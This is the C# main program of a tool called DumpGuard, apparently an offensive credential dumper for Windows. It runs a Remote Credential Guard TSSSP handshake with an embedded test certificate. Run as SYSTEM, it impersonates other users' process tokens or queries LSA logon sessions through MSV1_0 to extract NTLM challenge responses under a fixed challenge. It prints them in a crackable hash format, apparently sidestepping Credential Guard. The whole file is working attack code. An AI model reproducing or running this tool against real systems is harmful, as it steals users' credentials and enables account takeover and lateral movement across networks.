using DumpGuard.Tsssp;
using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace DumpGuard
{
    internal class Program
    {
        public static byte[] RcgTest_SelfSignedCert = new byte[]
        {
	        // Size (770):
	        0x02, 0x03, 0x00, 0x00,
	        // Data:
	        0x30, 0x82, 0x02, 0xfe, 0x30, 0x82, 0x01, 0xe6, 0xa0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x10, 0x18,
            0xc3, 0xbc, 0xda, 0x8f, 0x86, 0x41, 0x9b, 0x49, 0x8f, 0xcf, 0x3a, 0xe0, 0x59, 0x40, 0x7f, 0x30,
            0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b, 0x05, 0x00, 0x30, 0x12,
            0x31, 0x10, 0x30, 0x0e, 0x06, 0x03, 0x55, 0x04, 0x03, 0x0c, 0x07, 0x52, 0x63, 0x67, 0x54, 0x65,
            0x73, 0x74, 0x30, 0x1e, 0x17, 0x0d, 0x32, 0x35, 0x30, 0x37, 0x33, 0x31, 0x31, 0x39, 0x31, 0x35,
            0x32, 0x34, 0x5a, 0x17, 0x0d, 0x32, 0x36, 0x30, 0x37, 0x33, 0x31, 0x31, 0x39, 0x33, 0x35, 0x32,
            0x34, 0x5a, 0x30, 0x12, 0x31, 0x10, 0x30, 0x0e, 0x06, 0x03, 0x55, 0x04, 0x03, 0x0c, 0x07, 0x52,
            0x63, 0x67, 0x54, 0x65, 0x73, 0x74, 0x30, 0x82, 0x01, 0x22, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86,
            0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0f, 0x00, 0x30, 0x82,
            0x01, 0x0a, 0x02, 0x82, 0x01, 0x01, 0x00, 0xd7, 0x81, 0x42, 0x0b, 0x34, 0xd4, 0xa7, 0xbb, 0x94,
            0xab, 0x1e, 0x11, 0x0f, 0x94, 0xd5, 0xf9, 0xeb, 0xc5, 0xec, 0x67, 0xf6, 0x24, 0xac, 0x24, 0x9a,
            0xec, 0x15, 0x30, 0x2e, 0x2e, 0x09, 0xe3, 0x7f, 0x3a, 0xd8, 0x3b, 0xfc, 0x99, 0x5e, 0x08, 0xc8,
            0x68, 0x7c, 0x09, 0x70, 0xf6, 0x12, 0xb4, 0xee, 0xed, 0x50, 0x4c, 0x9d, 0x90, 0xb7, 0xf9, 0xc4,
            0xfc, 0x6c, 0xea, 0x3c, 0xdd, 0x25, 0xab, 0x21, 0x08, 0xc7, 0x2c, 0x60, 0x7a, 0x4d, 0x1a, 0xd5,
            0x1b, 0x4d, 0xbb, 0x57, 0x35, 0x37, 0x51, 0x15, 0x65, 0xca, 0x55, 0xeb, 0x34, 0xaf, 0xf9, 0xa1,
            0x43, 0x94, 0xe4, 0x02, 0xd1, 0xb0, 0xe0, 0x17, 0x30, 0x7b, 0x13, 0x64, 0xc3, 0x10, 0x04, 0x19,
            0xdb, 0xb1, 0xf1, 0xa6, 0x17, 0x6f, 0xdd, 0x9d, 0x49, 0x12, 0x5c, 0xe4, 0xa7, 0x60, 0xae, 0x5c,
            0xb2, 0x24, 0xb9, 0xbd, 0x23, 0x69, 0xae, 0x7a, 0x60, 0x41, 0x5e, 0x2d, 0x9c, 0x77, 0x65, 0xa6,
            0x99, 0x6d, 0x0b, 0xb5, 0xdb, 0xed, 0x0e, 0xd1, 0x87, 0xe8, 0xc4, 0xf2, 0x5a, 0x94, 0x34, 0x1a,
            0xaa, 0xef, 0x2c, 0xee, 0x50, 0x9f, 0xb2, 0x37, 0x72, 0x7f, 0xee, 0xba, 0x3c, 0x7a, 0x46, 0xe1,
            0x8d, 0x3b, 0xfd, 0x7f, 0x3a, 0x32, 0xd2, 0x46, 0xda, 0x56, 0xa2, 0x55, 0xea, 0xfb, 0xc5, 0xa7,
            0xc8, 0xc5, 0xa5, 0xe2, 0x43, 0x3d, 0x0e, 0xad, 0x5d, 0xa6, 0x43, 0xf6, 0xea, 0xd4, 0x8c, 0x55,
            0x26, 0xce, 0xba, 0xb0, 0xaf, 0x4d, 0x20, 0x7d, 0x02, 0x92, 0xf4, 0x26, 0xa8, 0x5a, 0xe0, 0x81,
            0x39, 0xe0, 0x36, 0xfa, 0x78, 0xbd, 0x3b, 0x88, 0x95, 0xa9, 0xe0, 0xd7, 0x68, 0x23, 0x36, 0xda,
            0x1c, 0x82, 0xbc, 0x6e, 0x9c, 0xe6, 0xac, 0xe3, 0x3e, 0xb0, 0x9f, 0xb3, 0xbe, 0x06, 0x7b, 0xd9,
            0x39, 0x1f, 0xf1, 0x8c, 0x22, 0x44, 0xe5, 0x02, 0x03, 0x01, 0x00, 0x01, 0xa3, 0x50, 0x30, 0x4e,
            0x30, 0x0e, 0x06, 0x03, 0x55, 0x1d, 0x0f, 0x01, 0x01, 0xff, 0x04, 0x04, 0x03, 0x02, 0x05, 0xa0,
            0x30, 0x1d, 0x06, 0x03, 0x55, 0x1d, 0x25, 0x04, 0x16, 0x30, 0x14, 0x06, 0x08, 0x2b, 0x06, 0x01,
            0x05, 0x05, 0x07, 0x03, 0x02, 0x06, 0x08, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x07, 0x03, 0x01, 0x30,
            0x1d, 0x06, 0x03, 0x55, 0x1d, 0x0e, 0x04, 0x16, 0x04, 0x14, 0x78, 0xd0, 0xe8, 0x12, 0x1c, 0x71,
            0x2b, 0x6d, 0x5d, 0xa5, 0x0a, 0x7f, 0xad, 0xa1, 0x61, 0x66, 0x75, 0xaa, 0x3d, 0xb0, 0x30, 0x0d,
            0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b, 0x05, 0x00, 0x03, 0x82, 0x01,
            0x01, 0x00, 0xb1, 0x34, 0xad, 0x4a, 0x25, 0x14, 0xb9, 0xb4, 0x3c, 0x2b, 0x55, 0xd5, 0x8a, 0xd2,
            0xeb, 0xfe, 0xde, 0x16, 0x69, 0x0e, 0x24, 0x0c, 0x67, 0xa5, 0x20, 0xd7, 0x20, 0xe2, 0x2d, 0xcb,
            0x2d, 0x08, 0x32, 0x3a, 0xb3, 0x19, 0x82, 0x2f, 0xcc, 0x80, 0xe1, 0x16, 0x71, 0x23, 0xe2, 0xa5,
            0x1c, 0x0f, 0x49, 0x46, 0xae, 0x50, 0x5a, 0xa0, 0x23, 0x5a, 0x36, 0x09, 0x27, 0xa9, 0x26, 0xce,
            0xee, 0xec, 0x2a, 0xa8, 0xad, 0x70, 0xa2, 0xfe, 0x82, 0x0f, 0x27, 0x80, 0xc9, 0xf1, 0xa6, 0xc5,
            0x67, 0xad, 0x90, 0xf6, 0x51, 0x39, 0xe9, 0xb3, 0x19, 0x31, 0x2d, 0xa9, 0x6f, 0x3b, 0x5c, 0x5b,
            0x1c, 0x29, 0xde, 0x29, 0x00, 0x56, 0x4b, 0xaf, 0x42, 0x93, 0x25, 0xb7, 0xac, 0x04, 0xd1, 0x1d,
            0xbc, 0x78, 0x48, 0xda, 0x81, 0x93, 0x83, 0x5f, 0x58, 0x54, 0x1e, 0x07, 0x64, 0x75, 0x7f, 0x86,
            0xab, 0x72, 0x99, 0x30, 0x8e, 0x39, 0x01, 0x59, 0xfd, 0x52, 0x73, 0xc8, 0x13, 0x0a, 0x69, 0xcf,
            0x66, 0x90, 0xc7, 0xeb, 0x74, 0x2b, 0x02, 0x1a, 0xf0, 0x3c, 0x7e, 0x79, 0x31, 0x87, 0xc4, 0x3d,
            0x4f, 0xd6, 0x56, 0x80, 0xa4, 0xfc, 0x0d, 0x4c, 0x12, 0xdd, 0x6a, 0xb5, 0x08, 0x73, 0x13, 0x59,
            0x95, 0x36, 0xe3, 0x38, 0xf2, 0x20, 0xa4, 0x72, 0xcf, 0x4d, 0xca, 0xf2, 0xa3, 0xb0, 0xfc, 0xdc,
            0x3b, 0xc2, 0x85, 0xab, 0x53, 0x11, 0x8a, 0xdf, 0xe4, 0xbe, 0x6a, 0x05, 0x8c, 0x84, 0xe4, 0xc5,
            0x82, 0x87, 0xa1, 0x0e, 0x96, 0xb2, 0xf5, 0xbb, 0xb3, 0x22, 0x4e, 0x1c, 0x9a, 0x60, 0xc1, 0x07,
            0x02, 0xad, 0x3d, 0x75, 0x00, 0xef, 0xed, 0x4b, 0xde, 0x94, 0xd7, 0x15, 0xfb, 0x8f, 0x44, 0x25,
            0x33, 0xb2, 0x30, 0x3f, 0x30, 0x9a, 0x3a, 0x68, 0x19, 0x72, 0x76, 0x27, 0x91, 0xbe, 0x52, 0xff,
            0x0f, 0x23
        };

        public static bool IsCredentialGuardEnabled()
        {
            using (var searcher = new ManagementObjectSearcher(@"root\Microsoft\Windows\DeviceGuard", "SELECT * FROM Win32_DeviceGuard"))
            {
                foreach (ManagementBaseObject query_object in searcher.Get())
                {
                    if (((uint[])query_object["SecurityServicesRunning"]).Any(v => v == 1))
                        return true;
                }

                return false;
            }
        }

        static void Main(string[] args)
        {
            var arguments = args.Select(s =>
            {
                if (!s.Contains(':'))
                    throw new ArgumentException($"Invalid arg format: '{s}'. Expected format: '/<key>:<value>'.");

                return s.Split(':');
            }).ToDictionary(p => p[0], p => p[1]);

            if (!arguments.TryGetValue("/mode", out string mode))
                Console.WriteLine("Please provide a mode with the /mode:[self|all] parameter.");
            else
            {
                if (mode.Equals("self"))
                    DumpCredentialsSelf(arguments);
                else if (mode.Equals("all"))
                    DumpCredentialsAll(arguments);
                else
                    Console.WriteLine($"No action could be performed for mode '{mode}'.");
            }
        }

        static void DumpCredentialsSelf(Dictionary<string, string> arguments)
        {
            if (!arguments.TryGetValue("/domain", out string domain) || !arguments.TryGetValue("/username", out string username) || !arguments.TryGetValue("/password", out string password))
                Console.WriteLine("You must supply the following arguments: /domain:xxx, /username:xxx, and /password:xxx");
            else
            {
                if (!arguments.TryGetValue("/salt", out string salt))
                    salt = string.Empty;

                if (!arguments.TryGetValue("/spn", out string spn))
                    spn = string.Empty;

                if (string.IsNullOrEmpty(spn))
                    spn = username.EndsWith("$") ? $"HOST/{username.TrimEnd('$').ToUpperInvariant()}" : spn;

                if (string.IsNullOrEmpty(spn))
                    throw new Exception("No viable target was defined - please use '/spn:xxx' if you are trying to authenticate to a user");

                var server = new TssspServer(domain, username, password, salt);

                using (var client = new TssspClient(server))
                {
                    if (!client.AcquireCredentialHandle())
                        throw new Exception("Failed to acquire TSSSP credential handle");

                    var client_input = new SecBufferDescWrapper(new SecBuffer(0), new SecBuffer(RcgTest_SelfSignedCert), new SecBuffer(0));
                    var client_output = new SecBufferDescWrapper(new SecBuffer(0));

                    var client_finished = false;
                    var server_finished = false;

                    while (!client_finished && !server_finished)
                    {
                        client_finished = client.InitializeSecurityContext(spn, client_input, ref client_output);
                        server_finished = server.AcceptSecurityContext(client_output.GetBuffer(0), out byte[] server_output);

                        if (server_output != null)
                            client_input.SetBuffer(0, server_output);
                    }

                    if (client_finished && server_finished)
                    {
                        if (server.NtlmCredBuffer == null)
                            throw new Exception("Failed to obtain an NTLM supplemental credential");

                        if (client.CallPackageLayer1(server.NtlmCredBuffer, out byte[] response))
                        {
                            var identity = WindowsIdentity.GetCurrent().Name;
                            var nt_response = BitConverter.ToString(response).Replace("-", "");

                            Console.WriteLine($"{identity}::{Environment.MachineName}::{nt_response}:1122334455667788");
                        }
                    }
                }
            }
        }

        static void DumpCredentialsAll(Dictionary<string, string> arguments)
        {
            if (!WindowsIdentity.GetCurrent().IsSystem)
                Console.WriteLine("Must run as SYSTEM to dump all.");
            else if (arguments.ContainsKey("/domain") && arguments.ContainsKey("/username") & arguments.ContainsKey("/password"))
                DumpCredentialsAllRemoteCredentialGuard(arguments);
            else
                DumpCredentialsAllNtlm(arguments);
        }

        static void DumpCredentialsAllRemoteCredentialGuard(Dictionary<string, string> arguments)
        {
            var dumped_identities = new HashSet<string>();

            foreach (var process in Process.GetProcesses())
            {
                var process_handle = IntPtr.Zero;

                try
                {
                    process_handle = process.Handle;
                }
                catch
                {
                    continue; // Some processes raise exceptions when we try to fetch the handle
                }

                var ProcessToken = IntPtr.Zero;

                try
                {
                    if (!Interop.OpenProcessToken(process_handle, 0x0008 /* TOKEN_QUERY */ | 0x0002 /* TOKEN_DUPLICATE */, out ProcessToken))
                        throw new Exception($"OpenProcessToken failed with error: {Marshal.GetLastWin32Error()}");

                    var identity = new WindowsIdentity(ProcessToken);
                    var identity_sid = identity.User?.ToString();

                    if (!string.IsNullOrEmpty(identity_sid) && !dumped_identities.Contains(identity_sid) && identity_sid.StartsWith("S-1-5-21-"))
                    {
                        var DuplicatedToken = IntPtr.Zero;

                        try
                        {
                            if (!Interop.DuplicateToken(ProcessToken, 2 /* SecurityImpersonation */, out DuplicatedToken))
                                throw new Exception($"DuplicateToken failed with error: {Marshal.GetLastWin32Error()}");

                            if (!Interop.ImpersonateLoggedOnUser(DuplicatedToken))
                                throw new Exception($"ImpersonateLoggedOnUser failed with error: {Marshal.GetLastWin32Error()}");

                            try
                            {
                                DumpCredentialsSelf(arguments);
                                dumped_identities.Add(identity_sid);
                            }
                            finally
                            {
                                Interop.RevertToSelf();
                            }
                        }
                        finally
                        {
                            if (DuplicatedToken != IntPtr.Zero)
                                Interop.CloseHandle(DuplicatedToken);
                        }
                    }
                }
                finally
                {
                    if (ProcessToken != IntPtr.Zero)
                        Interop.CloseHandle(ProcessToken);
                }
            }
        }

        static void DumpCredentialsAllNtlm(Dictionary<string, string> arguments)
        {
            var status = 0;

            IEnumerable<Tuple<string, LUID>> GetLogonSessions()
            {
                string SidToString(IntPtr SidPtr)
                {
                    string sid_string = null;

                    if (SidPtr != IntPtr.Zero && Interop.ConvertSidToStringSid(SidPtr, out IntPtr StringSid))
                    {
                        sid_string = Marshal.PtrToStringAuto(StringSid);
                        Interop.LocalFree(StringSid);
                    }

                    return sid_string;
                }

                var result = new List<Tuple<string, LUID>>();

                if ((status = Interop.LsaEnumerateLogonSessions(out int session_count, out var session_list_ptr)) < 0)
                    Console.WriteLine($"LsaEnumerateLogonSessions failed with error: {status:x}.");
                else
                {
                    for (int i = 0; i < session_count; i++)
                    {
                        var luid_ptr = session_list_ptr + (i * Marshal.SizeOf<LUID>());
                        var luid = Marshal.PtrToStructure<LUID>(luid_ptr);

                        if ((status = Interop.LsaGetLogonSessionData(luid_ptr, out var session_data_ptr)) < 0)
                            Console.WriteLine($"LsaGetLogonSessionData failed with error: {status:x}.");
                        else
                        {
                            var session_data = Marshal.PtrToStructure<SECURITY_LOGON_SESSION_DATA>(session_data_ptr);

                            if (SidToString(session_data.Sid)?.StartsWith("S-1-5-21-") == true)
                            {
                                var domain = session_data.LogonDomain.ToString();
                                var username = session_data.UserName.ToString();

                                if (!string.IsNullOrEmpty(domain) && !string.IsNullOrEmpty(username))
                                    result.Add(new Tuple<string, LUID>($"{domain}\\{username}", luid));
                            }

                            Interop.LsaFreeReturnBuffer(session_data_ptr);
                        }
                    }

                    Interop.LsaFreeReturnBuffer(session_list_ptr);
                }

                return result;
            }

            if ((status = Interop.LsaConnectUntrusted(out IntPtr LsaHandle)) < 0)
                Console.WriteLine($"LsaConnectUntrusted failed with error: {status:x}");
            else
            {
                var PackageName = new LSA_STRING("MICROSOFT_AUTHENTICATION_PACKAGE_V1_0");

                if ((status = Interop.LsaLookupAuthenticationPackage(LsaHandle, ref PackageName, out uint AuthenticationPackage)) < 0)
                    Console.Write($"LsaLookupAuthenticationPackage failed with error: {status:x}");
                else
                {
                    var request = new MSV1_0_GETCHALLENRESP_REQUEST
                    {
                        MessageType = 1, // MsV1_0Lm20GetChallengeResponse
                        ParameterControl = MSV1_0_GETCHALLENRESP_ParameterControl.USE_PRIMARY_PASSWORD | MSV1_0_GETCHALLENRESP_ParameterControl.GCR_VSM_PROTECTED_PASSWORD,
                        ChallengeToClient = new byte[] { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 }
                    };

                    var dumped_creds = new HashSet<string>();

                    foreach (var session in GetLogonSessions())
                    {
                        request.LogonId = session.Item2;

                        var request_bytes = request.ToRawBytes();

                        if ((status = Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, request_bytes, request_bytes.Length, out var ReturnBuffer, out var ReturnBufferSize, out var ProtocolStatus)) < 0)
                            Console.WriteLine($"LsaCallAuthenticationPackage failed with error: {status:x}");
                        else if (ProtocolStatus < 0)
                            Console.WriteLine($"LsaCallAuthenticationPackage failed with error (protocol status): {ProtocolStatus:x}");
                        else
                        {
                            var response = Marshal.PtrToStructure<MSV1_0_GETCHALLENRESP_RESPONSE>(ReturnBuffer);

                            byte[] nt_response_bytes = null;

                            if (response.CaseInsensitiveChallengeResponse.Length >= 24)
                                nt_response_bytes = response.CaseInsensitiveChallengeResponse.ToBytes();
                            else if (response.CaseSensitiveChallengeResponse.Length >= 24)
                                nt_response_bytes = response.CaseSensitiveChallengeResponse.ToBytes();

                            if (nt_response_bytes != null)
                            {
                                var nt_response = BitConverter.ToString(nt_response_bytes).Replace("-", "");
                                var nt_response_string = $"{session.Item1}::{Environment.MachineName}::{nt_response}:1122334455667788";

                                if (!dumped_creds.Contains(nt_response_string))
                                {
                                    Console.WriteLine(nt_response_string);
                                    dumped_creds.Add(nt_response_string);
                                }
                            }

                            Interop.LsaFreeReturnBuffer(ReturnBuffer);
                        }
                    }
                }

                PackageName.Dispose();
                Interop.LsaDeregisterLogonProcess(LsaHandle);
            }
        }
    }
}
